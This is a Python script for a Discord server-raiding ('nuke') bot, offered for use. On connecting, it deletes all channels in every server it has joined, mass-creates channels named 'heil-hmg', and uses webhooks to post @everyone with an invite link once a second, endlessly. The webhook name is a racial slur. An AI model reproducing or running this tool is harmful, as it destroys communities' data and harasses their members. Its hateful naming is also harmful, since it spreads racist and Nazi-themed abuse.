import discord
import asyncio

intents = discord.Intents.all()
hmg = discord.Client(intents=intents)

token = input("Bot Token: ")

@hmg.event
async def on_connect():
  for guild in hmg.guilds:
    for c in guild.channels:
      await c.delete()
      print(f"{c} Deleted!")
      for x in range(20):
        await guild.create_text_channel("heil-hmg")
        print(f"{x} Channels Created!")

@hmg.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name="NIGGERED BY ĦМ₲")
    try:
        while True:
          await asyncio.sleep(1)
          await webhook.send("@everyone https://discord.gg/rdXHweYQ7f")
    except:
        pass

hmg.run(token)
